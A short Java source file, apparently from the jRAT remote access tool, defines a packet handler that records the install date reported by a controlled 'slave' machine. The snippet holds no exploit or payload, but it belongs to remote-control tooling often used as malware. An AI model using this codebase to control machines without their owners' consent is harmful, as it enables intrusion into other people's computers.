package su.jrat.client.packets.incoming;

import java.io.DataInputStream;

import su.jrat.client.Slave;


public class Packet31InitInstallationDate extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String date = slave.readLine();
		slave.setInstallDate(date);
	}

}